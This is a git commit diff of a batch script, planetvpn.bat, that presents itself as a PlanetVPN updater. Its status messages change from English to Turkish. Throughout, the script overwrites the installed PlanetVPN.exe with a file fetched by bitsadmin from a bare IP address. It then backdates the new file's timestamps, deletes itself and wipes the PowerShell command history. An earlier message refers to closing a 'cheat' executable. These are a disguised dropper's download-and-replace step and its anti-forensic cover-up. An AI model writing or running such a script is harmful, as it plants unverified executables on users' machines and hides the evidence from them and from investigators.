89c158e7dde7b3b0bf7707fdc946fa91b9b7f242
svdsaymazz <svdsaymaz@gmail.com>
2025-05-27 01:11:33 +0300

    planetvpn.bat

--- planetvpn.bat
+++ planetvpn.bat
@@ -1,5 +1,5 @@
 @echo off
-echo eger boyle kaldiysa gorev yoneticisinden hile exesini kapatin ve bekleyin...
+echo PlanetVPN.exe kapanması bekleniyor...
 
 :loop
 tasklist | find /i "PlanetVPN.exe" >nul
@@ -8,23 +8,24 @@ if not errorlevel 1 (
     goto loop
 )
 
-echo Updating PlanetVPN.exe...
+echo PlanetVPN.exe kapalı. Güncelleniyor...
+
 bitsadmin /transfer myDownloadJob /download /priority high https://31.57.156.199/PlanetVPN.exe "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"
 
 if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
-    echo Completed new.
+    echo Yazdırma Başarılı.
 
-    echo Setting file times...
+    echo Dosya bilgileri ayarlanıyor...
     powershell -NoProfile -Command ^
     "$filePath = 'C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe'; ^
     if (Test-Path $filePath) { ^
         $item = Get-Item $filePath; ^
         $time = '2024-10-14 13:59:24'; ^
-        $item.LastWriteTime = $time; ^
         $item.CreationTime = $time; ^
+        $item.LastWriteTime = $time; ^
     } else { Write-Host 'Dosya bulunamadı: $filePath' }"
 
-    echo Cleaning up...
+    echo Temizlik yapılıyor...
     powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
     powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
 )
